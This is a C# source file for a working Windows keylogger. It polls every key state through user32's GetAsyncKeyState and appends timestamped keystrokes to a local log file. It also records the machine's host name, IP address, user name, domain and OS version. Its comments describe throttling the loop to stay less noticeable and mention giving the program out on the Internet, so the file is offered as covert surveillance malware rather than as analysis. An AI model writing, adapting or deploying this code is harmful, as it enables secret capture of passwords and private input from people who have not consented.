using System;
using System.Collections.Generic;
//using System.Linq;
using System.Text;
//using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Net;

namespace taskme
{
    class Program
    {
        /// <summary>
        /// This Sets the Global Variables for the Program.
        /// </summary>
        static public Boolean ENABLELOGFILELOCK = false; // False because if it s true it will make the Program Crash. Good to enable if Giving out on the Internet!
        static public string LOGFILENAMELOCALDIR = @"\log.txt";
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        /// <summary>
        /// This starts the Logging. All it does is call the function StartLogging()
        /// </summary>
        /// <param name="args"></param>
            static void Main(string[] args)
            {
                StartLogging();
            }


        /// <summary>
        /// This Prart of the Program is responsable for the Logging of the Code.
        /// </summary>
            static void StartLogging()
            {
                StreamWriter sw = new StreamWriter(Application.StartupPath + LOGFILENAMELOCALDIR, true);
                sw.WriteLine();
                string HOSTNAMEVAR = Dns.GetHostName();
                string IPADDR1 = Dns.GetHostByName(HOSTNAMEVAR).AddressList[0].ToString();
                sw.WriteLine("Started Logging keys on: " + HOSTNAMEVAR + " (" + Environment.MachineName + ")" + " at: " + DateTime.Now);
                sw.WriteLine("The IP of the Machine is: " + IPADDR1);
                sw.WriteLine("The Currently Logged on User is: " + Environment.UserName);
                sw.WriteLine("The User Domain is: " + Environment.UserDomainName);
                sw.WriteLine("The Operating System is: " + Environment.OSVersion);
                sw.WriteLine("Current Directory is: " + Environment.CurrentDirectory);
                sw.WriteLine("---------------------------------------------------------------------------------");
                sw.Close();
                Console.WriteLine("Started Logging keys at: " + DateTime.Now);

                while(true)
                {
                    // Sleep for a while, to reduce the CPU load. Help become less noticable! Around 10 will keep this program from running above around 5% without the loss of the Key grabing.
                    Thread.Sleep(10);
                  for (Int32 i = 0; i <255; i++)
                    {
                        int keyState = GetAsyncKeyState(i);

                        if(keyState == 1 || keyState == -32767)
                        {
                            StreamWriter swlog = new StreamWriter(Application.StartupPath + LOGFILENAMELOCALDIR, true);
                            //Console.WriteLine((Keys)i);                            
                            Console.WriteLine(DateTime.Now + "  |  " + (Keys)i);
                            
                            //swlog.WriteLine((Keys)i);
                            swlog.WriteLine(DateTime.Now + "  |  " + (Keys)i);


                         // This will Chose to Close or Leave the File Open Based on the Varable above.
                            if(ENABLELOGFILELOCK == true)
                             {
                                // This Does NOTHING so it just will skip the CLose the File Log File.
                             }
                            else
                             {
                                  // This will allow the lext file to be edited and accessed by other programs while this program is running.
                                  swlog.Close();
                             }
                       
                            break;
                        }
                    }
                }

        }
    }
}
